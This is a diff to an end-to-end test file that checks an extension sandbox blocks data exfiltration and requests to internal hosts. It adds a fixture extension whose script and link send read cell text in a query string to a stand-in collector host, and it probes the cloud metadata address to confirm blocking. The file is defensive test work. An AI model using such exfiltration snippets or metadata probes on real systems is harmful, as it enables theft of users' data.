@@ -4,6 +4,10 @@
 // goes through the auth-worker proxy. The proxy's own refusals (no grant,
 // undeclared or internal hosts) are checked against the real worker; the Door43
 // answer itself is mocked at the browser (no live network in e2e).
+//
+// And that proxy is the ONLY way out: an extension that navigates its own
+// frame (location.href, a clicked link) to carry what it read in the query
+// string is refused by the browser before any request is made.
 
 import { test, expect } from "../../helpers/multi-user"
 import { ToolsPage } from "../../helpers/page-objects/ToolsPage"
@@ -83,4 +87,59 @@ test("an extension asks before reading git.door43.org; denied it gets nothing, a
   expect(await webFetch(jwt, seeded.projectId, toolId, "https://example.org/x")).toMatchObject({ status: 403, body: { error: { code: "host_not_allowed" } } })
   expect(await webFetch(jwt, seeded.projectId, toolId, "https://169.254.169.254/latest/meta-data")).toMatchObject({ status: 403, body: { error: { code: "host_blocked" } } })
   expect(await webFetch(jwt, seeded.projectId, toolId, "http://git.door43.org/x")).toMatchObject({ status: 400, body: { error: { code: "invalid_url" } } })
+})
+
+const LEAK = "https://collector.invalid"
+const LEAKER = "Leaker"
+// Nothing here is banned by the lint or stopped by the tool's own CSP: a
+// sandboxed frame may navigate itself. Only the shell frame around it
+// (src/lib/tools/srcdoc.ts, TOOL_SHELL_CSP) says no.
+const LEAKER_SOURCE = `<!doctype html><html><body>
+<button id="go">Send it out</button>
+<a href="${LEAK}/?via=link&d=cell-text">Read the docs</a>
+<script>
+document.getElementById("go").onclick = () => { location.href = ${JSON.stringify(`${LEAK}/?via=location&d=`)} + encodeURIComponent("cell text") }
+</script></body></html>`
+
+test("an extension cannot send what it read anywhere by navigating its own frame", async ({ alice }) => {
+  const jwt = await jwtFor("alice")
+  const seeded = await seedProjectWithFile(jwt, { smartExtensions: true, name: `Leak ${Date.now()}` })
+  const res = await fetch(`${AUTH}/api/v2/projects/${seeded.projectId}/tools`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json", Authorization: `Bearer ${jwt}` },
+    body: JSON.stringify({
+      source: LEAKER_SOURCE,
+      manifest: { name: LEAKER, description: "Tries to leave.", scopes: ["read:cells"], mounts: ["page"], apiRev: 6 },
+      origin: "builder",
+      grant: ["read:cells"],
+    }),
+  })
+  expect(res.status, await res.clone().text()).toBe(201)
+  const toolId = ((await res.json()) as { tool: { id: string } }).tool.id
+
+  // A request that got out lands here; a navigation the browser refused is logged by the browser.
+  const reached: string[] = []
+  await alice.route(`${LEAK}/**`, async (route) => {
+    reached.push(route.request().url())
+    await route.fulfill({ contentType: "text/html", body: "collected" })
+  })
+  const refused: string[] = []
+  alice.on("console", (message) => {
+    if (message.text().includes(LEAK) && message.text().includes("frame-src 'none'")) refused.push(message.text())
+  })
+
+  const tools = new ToolsPage(alice)
+  const attempts = [
+    { how: "location.href", leave: () => tools.toolFrame(LEAKER).getByRole("button", { name: "Send it out" }).click() },
+    { how: "a clicked link", leave: () => tools.toolFrame(LEAKER).getByRole("link", { name: "Read the docs" }).click() },
+  ]
+  for (const { how, leave } of attempts) {
+    // A refused navigation leaves the frame dead, so each attempt starts from a fresh one.
+    await alice.goto(`/project/${seeded.projectId}/extensions/${toolId}`)
+    const refusedBefore = refused.length
+    await leave()
+    // Settled either way: the browser refused it, or a request went out.
+    await expect.poll(() => refused.length - refusedBefore + reached.length, { message: `${how}: neither refused nor sent` }).toBeGreaterThan(0)
+    expect(reached, `${how}: nothing may leave the extension's frame`).toEqual([])
+  }
 })
